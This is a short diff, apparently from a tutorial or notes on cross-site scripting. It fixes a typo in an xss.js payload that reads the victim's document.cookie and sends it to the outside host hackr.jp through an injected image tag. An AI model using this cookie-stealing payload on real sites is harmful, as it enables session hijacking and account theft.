@@ -42,7 +42,7 @@ f.method="get";</script><span+s="
 
 ```javascript
 //xss.js
-var content=escape(document.cookies);
+var content=escape(document.cookie);
 document.write("<img src='http://hackr.jp/?'");
 document.write(content);
 document.write(">");
